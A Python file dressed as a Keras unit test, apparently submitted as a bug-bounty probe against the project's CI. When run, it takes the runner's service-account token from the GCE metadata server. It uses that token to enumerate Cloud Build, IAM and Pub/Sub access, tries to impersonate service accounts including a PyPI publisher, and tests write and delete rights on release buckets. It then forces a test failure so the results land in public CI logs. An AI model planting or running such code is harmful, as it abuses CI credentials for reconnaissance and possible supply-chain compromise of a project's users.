"""OSS VRP: read-only Cloud Build / impersonation IAM probe. Will close."""

import json
import os
import socket
import urllib.error
import urllib.request

from keras.src import testing


def _http(url, headers=None, timeout=8, data=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    if data is not None:
        req.method = "POST"
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:800]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _gce(path):
    return _http(
        "http://169.254.169.254/computeMetadata/v1/" + path,
        headers={"Metadata-Flavor": "Google"},
    )


def _append_summary(text):
    path = os.environ.get("GITHUB_STEP_SUMMARY")
    if not path:
        return
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(text if text.endswith("\n") else text + "\n")


class CiCloudBuildIamTest(testing.TestCase):
    def test_report_cloudbuild_iam(self):
        lines = [
            f"hostname={socket.gethostname()}",
            f"uid={os.getuid()}",
        ]
        _, project = _gce("project/project-id")
        project = project.strip()
        _, project_number = _gce("project/numeric-project-id")
        project_number = project_number.strip()
        _, email = _gce("instance/service-accounts/default/email")
        email = email.strip()
        lines.append(f"gce_project={project}")
        lines.append(f"gce_project_number={project_number}")
        lines.append(f"gce_sa_email={email}")

        token_status, token_body = _gce(
            "instance/service-accounts/default/token"
        )
        self.assertEqual(token_status, 200)
        access_token = json.loads(token_body)["access_token"]
        auth = {"Authorization": "Bearer " + access_token}

        cb_perms = json.dumps(
            {
                "permissions": [
                    "cloudbuild.builds.create",
                    "cloudbuild.builds.list",
                    "cloudbuild.builds.get",
                    "cloudbuild.builds.update",
                    "cloudbuild.triggers.run",
                    "cloudbuild.triggers.get",
                    "cloudbuild.triggers.list",
                ]
            }
        ).encode()
        for resource, slug in (
            (f"projects/{project}", "project"),
            (
                f"projects/{project}/locations/us-central1",
                "loc_usc1",
            ),
            (f"projects/{project}/locations/global", "loc_global"),
        ):
            code, body = _http(
                "https://cloudbuild.googleapis.com/v1/"
                f"{resource}:testIamPermissions",
                headers=auth,
                data=cb_perms,
            )
            lines.append(f"cb_iam_{slug}={code} {body.strip()[:400]}")

        for label, url in (
            (
                "cb_builds_usc1",
                "https://cloudbuild.googleapis.com/v1/"
                f"projects/{project}/locations/us-central1/builds?pageSize=1",
            ),
            (
                "cb_builds_global",
                "https://cloudbuild.googleapis.com/v1/"
                f"projects/{project}/builds?pageSize=1",
            ),
            (
                "cb_triggers",
                "https://cloudbuild.googleapis.com/v1/"
                f"projects/{project}/triggers",
            ),
            (
                "cb_github_enterprise",
                "https://cloudbuild.googleapis.com/v1/"
                f"projects/{project}/githubEnterpriseConfigs",
            ),
            (
                "pubsub_topics",
                "https://pubsub.googleapis.com/v1/"
                f"projects/{project}/topics",
            ),
            (
                "iam_sas",
                "https://iam.googleapis.com/v1/"
                f"projects/{project}/serviceAccounts",
            ),
        ):
            code, body = _http(url, headers=auth)
            lines.append(f"{label}={code} {body.strip()[:400]}")

        impersonate_targets = [
            f"{project_number}@cloudbuild.gserviceaccount.com",
            f"{project_number}-compute@developer.gserviceaccount.com",
            (
                f"service-{project_number}"
                "@gcp-sa-cloudbuild.iam.gserviceaccount.com"
            ),
            (
                f"service-{project_number}"
                "@gcp-sa-artifactregistry.iam.gserviceaccount.com"
            ),
            (
                f"service-{project_number}"
                "@container-engine-robot.iam.gserviceaccount.com"
            ),
            f"workload-keras-sa@{project}.iam.gserviceaccount.com",
            "keras@keras-team.iam.gserviceaccount.com",
            "pypi-publisher@keras-team.iam.gserviceaccount.com",
        ]
        token_req = json.dumps(
            {"scope": ["https://www.googleapis.com/auth/cloud-platform"]}
        ).encode()
        for sa in impersonate_targets:
            code, body = _http(
                "https://iamcredentials.googleapis.com/v1/projects/-/"
                f"serviceAccounts/{sa}:generateAccessToken",
                headers=auth,
                data=token_req,
            )
            # Never log access tokens; only status and error/expiry fields.
            snippet = body.strip()[:250]
            if "accessToken" in snippet:
                snippet = "TOKEN_PRESENT"
            lines.append(f"impersonate_{sa.split('@')[0][:40]}={code} {snippet}")

        extra_buckets = (
            "keras",
            "tf-keras",
            "tf-builds",
            "tensorflow-staging",
            "pypi-packages",
            "keras-nightly-wheels",
            "ml-pipeline-artifacts",
            "cloud-tpu-tfrun",
        )
        q = "&".join(
            "permissions=" + perm
            for perm in (
                "storage.objects.create",
                "storage.objects.update",
                "storage.objects.delete",
                "storage.objects.get",
                "storage.objects.list",
            )
        )
        for bucket in extra_buckets:
            code, body = _http(
                "https://storage.googleapis.com/storage/v1/b/"
                f"{bucket}/iam/testPermissions?{q}",
                headers=auth,
            )
            granted = body.strip().replace("\n", " ")[:220]
            lines.append(f"gcs_perm_{bucket}={code} {granted}")

        report = "\n".join(lines)
        _append_summary(
            "## OSS VRP Cloud Build IAM\n```\n" + report + "\n```\n"
        )
        print(report, flush=True)
        self.fail("cloudbuild iam\n" + report)
